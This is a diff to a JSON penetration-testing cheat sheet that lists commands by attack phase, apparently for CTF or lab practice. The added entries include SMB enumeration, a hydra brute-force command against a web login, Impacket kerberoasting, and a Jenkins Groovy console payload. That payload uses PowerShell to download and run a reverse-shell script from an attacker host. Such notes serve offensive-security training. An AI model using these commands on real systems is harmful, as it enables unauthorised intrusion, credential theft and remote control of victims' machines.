@@ -12,6 +12,11 @@
             "description": "Similar to the basic nmap scan except it will check all ports, the '-oA' will save it in the three main file formats, you don't have to include this."
         },
         {
+            "command": "smbmap -H [IP] -d [domain]",
+            "section": "Recon",
+            "description": "Enumerate available SMB shares. For the IP address, you don't have to indicate the port, just put the IP address."
+        },
+        {
             "command": "dirb [url] [wordlist]",
             "section": "Recon",
             "description": "Can also utilize the GUI version dirbuster (though I find that to be slower)."
@@ -56,28 +61,38 @@
     "init":
     [
         {
-            "command": "Start a reverse shell",
+            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[login page uri]:__VIEWSTATE=[full viewstate from burp suite]:[string that displays failed attempt]\"",
             "section": "Initial Access",
-            "description": "Needs access to remote code execution."
+            "description": "Using hydra to brute force a login web page. "
         },
         {
-            "command": "groovy> [temp placement]",
+            "command": "smbclient \\\\[IP]\\[share]",
             "section": "Initial Access",
-            "description": "second initial access placeholder"
+            "description": "Access a SMB share that you have access to. Remember to account for escape characters in bash. Might need to add two backslashes before the IP address and one one before the share name."
+        },
+        {
+            "command": "groovy> cmd = \"powershell iex (New-Object Net.WebClient).DownloadString('[attacker ip]:[attacker web port]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [attacker ip] -Port [attacker listening port]\"<br><br>groovy> cmd.execute()",
+            "section": "Initial Access",
+            "description": "If you have access to the Jenkins webpage (requires login) you can get to the script console page. This page will execute groovy commands which can be utilized to perform remote code execution. By utilizing nishang powershell scripts (specifically the reverse shell module Invoke-PowerShellTcp.ps1), you can load the script and execute it to gain initial access. The above command requires the attacker machine to have a webserver running with nishang's Invoke-PowerShellTcp.ps1 module."
         }
     ],
 
     "privesc":
     [
         {
-            "command": "GTFObins",
+            "command": "GetUserSPNs.py -request -dc-ip [ip] [domain name]/[user][password]",
             "section": "Privilege Escalation",
-            "description" : "[Windows][Linux] Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
+            "description": "[Windows] Performs a kerberoast attack using the Impacket toolkit. This requires you to have an authorized username and password and for active directory to be enabled on the victim machine. "
         },
         {
             "command": "runas /savecred /user:[escalated user] \"[exe path]\"",
             "section": "Privilege Escalation",
             "description": "[Windows] If you see that runas /savecred is available or have identified stored credentials for a privileged user, you can run commands as that privileged user without supplying a password. Generate a reverse shell using msfvenom, upload to victim system, and run it using the runas command."
+        },
+        {
+            "command": "GTFObins",
+            "section": "Privilege Escalation",
+            "description" : "[Windows][Linux] Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
         },
         {
             "command": "sudo -l",
@@ -148,7 +163,7 @@
             "description": "[Windows] Download files to the victim system using native OS binary."
         },
         {
-            "command": "get \"[file name]\"",
+            "command": "ftp> get \"[file name]\"",
             "section": "Exfiltration/File Movement",
             "description": "Downloads files from an FTP server. It’s important to distinguish if you need to utilize FTP’s ASCII mode or Binary mode as initially when connecting to a FTP server, ASCII mode is the default mode. To change mode you can simply type 'binary' in the FTP shell. File types to use ASCII mode: txt, asp, html, php (generally text-based files such as source code, web pages, etc). File types to use binary mode: jpg, gif, wav, mp3, mp4, zip, tar, exe, pdf, mdb (generally image files, sound files, video files, archive files, etc)."
         }
